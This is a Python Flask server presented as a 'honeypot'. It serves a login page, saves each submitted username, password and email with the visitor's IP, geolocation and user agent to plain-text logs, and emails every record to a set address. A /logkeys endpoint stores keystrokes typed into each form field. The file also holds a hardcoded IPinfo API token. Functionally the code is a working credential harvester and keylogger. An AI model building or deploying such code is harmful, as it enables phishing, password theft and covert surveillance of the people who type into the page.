from flask import Flask, request, render_template, jsonify
import requests
from datetime import datetime
import smtplib
import os
from config import Config

app = Flask(__name__)
app.config.from_object(Config)

# Email Alert Setup
ALERT_EMAIL = app.config.get('ALERT_EMAIL', 'test@example.com')
EMAIL_PASSWORD = app.config.get('EMAIL_PASSWORD', '')
TO_EMAIL = app.config.get('TO_EMAIL', 'test@example.com')
SMTP_SERVER = app.config.get('SMTP_SERVER', 'localhost')
SMTP_PORT = app.config.get('SMTP_PORT', 1025)
USE_TLS = app.config.get('USE_TLS', False)

def send_email(subject, message):
    try:
        # Set a shorter timeout to avoid long waits when network is blocking SMTP
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=5)
        if USE_TLS:
            server.starttls()
        if SMTP_SERVER != 'localhost':
            server.login(ALERT_EMAIL, EMAIL_PASSWORD)
        email_msg = f"Subject: {subject}\n\n{message}"
        server.sendmail(ALERT_EMAIL, TO_EMAIL, email_msg)
        server.quit()
        print(f"Email sent to {TO_EMAIL}")
        return True
    except Exception as e:
        error_msg = f"Failed to send email: {e}"
        print(error_msg)
        with open('email_errors.log', 'a') as logf:
            logf.write(f"[{datetime.now()}] {error_msg}\n")
        return False

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "N/A")
        password = request.form.get("password", "N/A")
        email = request.form.get("email", "N/A")
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'N/A')

        # IP Location Tracking with enhanced data
        try:
            # Use the IPinfo API with your API key
            api_key = "015af633e3a16a"  # Your IPinfo API key
            
            # Get real location data for all IPs
            print(f"IP detected: {ip}, fetching accurate location data")
            
            # For private IPs, we'll use an external service to get approximate location
            # This will provide more accurate data than mock values
            if ip.startswith('10.') or ip.startswith('192.168.') or ip == '127.0.0.1':
                # Use ipapi.co which doesn't require registration for basic usage
                url = f"https://ipapi.co/json/"
            else:
                # For public IPs, use IPinfo as before
                url = f"https://ipinfo.io/{ip}/json?token={api_key}"
                
            res = requests.get(url, timeout=5)
            location_data = res.json()
            
            # Extract location data
            city = location_data.get('city', 'Unknown')
            region = location_data.get('region', 'Unknown') or location_data.get('region_name', 'Unknown')
            country = location_data.get('country', 'Unknown') or location_data.get('country_name', 'Unknown')
            org = location_data.get('org', 'Unknown') or location_data.get('org_name', 'Unknown')
            
            # Extract coordinates - handle different API formats
            if 'loc' in location_data:
                # IPinfo format
                loc = location_data.get('loc', '').split(',')
                latitude = loc[0] if len(loc) > 0 else 'Unknown'
                longitude = loc[1] if len(loc) > 1 else 'Unknown'
            else:
                # ipapi.co format
                latitude = str(location_data.get('latitude', 'Unknown'))
                longitude = str(location_data.get('longitude', 'Unknown'))
            
            print(f"Location data retrieved: {city}, {region}, {country} | Coordinates: {latitude}, {longitude}")
        except Exception as e:
            # If anything fails, use fallback data
            print(f"Error getting location data: {str(e)}")
            city = "Unknown"
            region = "Unknown"
            country = "Unknown"
            latitude = "Unknown"
            longitude = "Unknown"
            org = "Unknown"

        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_entry = (
            f"[{time}] IP: {ip} | Username: {username} | Email: {email} | Password: {password} | "
            f"Location: {city}, {region}, {country} | "
            f"Coordinates: {latitude}, {longitude} | ISP: {org} | User-Agent: {user_agent}\n"
        )

        # Save to logs with timestamp to ensure we can see when entries were added
        with open("logs.txt", "a") as f:
            f.write(log_entry)
        
        # Create a detailed log file with all attempts
        with open("detailed_logs.txt", "a") as f:
            f.write(f"\n==== HONEYPOT ATTEMPT DETAILS ====\n")
            f.write(f"Timestamp: {time}\n")
            f.write(f"IP Address: {ip}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Email: {email}\n")
            f.write(f"Password: {password}\n")
            f.write(f"User-Agent: {user_agent}\n")
            f.write(f"Location Data:\n")
            f.write(f"  City: {city}\n")
            f.write(f"  Region: {region}\n")
            f.write(f"  Country: {country}\n")
            f.write(f"  Latitude: {latitude}\n")
            f.write(f"  Longitude: {longitude}\n")
            f.write(f"  ISP/Organization: {org}\n")
            f.write(f"==== END OF ENTRY ====\n")

        # Send alert and log if it fails
        email_sent = send_email("🚨 Honeypot Alert!", log_entry)
        if not email_sent:
            with open("email_failures.log", "a") as f:
                f.write(f"[{time}] Failed to send email alert for login attempt from {ip}\n")
            print("Email alert could not be sent - check your network connection or SMTP settings")

        return "Login failed. Please try again."

    return render_template("login.html")

@app.route("/logkeys", methods=["POST"])
def log_keys():
    try:
        # Get JSON data from request
        data = request.get_json()
        if not data:
            print("Warning: Empty data received in logkeys route")
            return jsonify({"error": "No data received"}), 400
            
        # Extract data with defaults
        timestamp = data.get("timestamp", datetime.now().isoformat())
        key = data.get("key", "N/A")
        field = data.get("field", "N/A")
        user_agent = data.get("userAgent", "N/A")
        ip = request.remote_addr

        # Get location data for the IP
        try:
            # Use the IPinfo API with your API key
            api_key = "015af633e3a16a"  # Your IPinfo API key
            
            # For private IPs, use mock data for testing
            if ip.startswith('10.') or ip.startswith('192.168.') or ip == '127.0.0.1':
                city = "Test City"
                country = "Test Country"
            else:
                # For public IPs, get real location data
                url = f"https://ipinfo.io/{ip}/json?token={api_key}"
                res = requests.get(url, timeout=3)
                location_data = res.json()
                city = location_data.get('city', 'Unknown')
                country = location_data.get('country', 'Unknown')
        except Exception:
            city = "Unknown"
            country = "Unknown"

        # Create log entry with location data
        log_entry = (
            f"[{timestamp}] IP: {ip} | Location: {city}, {country} | Field: {field} | Key: {key} | User-Agent: {user_agent}\n"
        )

        # Write to keylog file
        with open("keylog.txt", "a") as f:
            f.write(log_entry)
        
        return "", 204  # No content, success
    except Exception as e:
        error_msg = f"Error in logkeys route: {str(e)}"
        print(error_msg)
        with open("keylogger_errors.log", "a") as f:
            f.write(f"[{datetime.now()}] {error_msg}\n")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)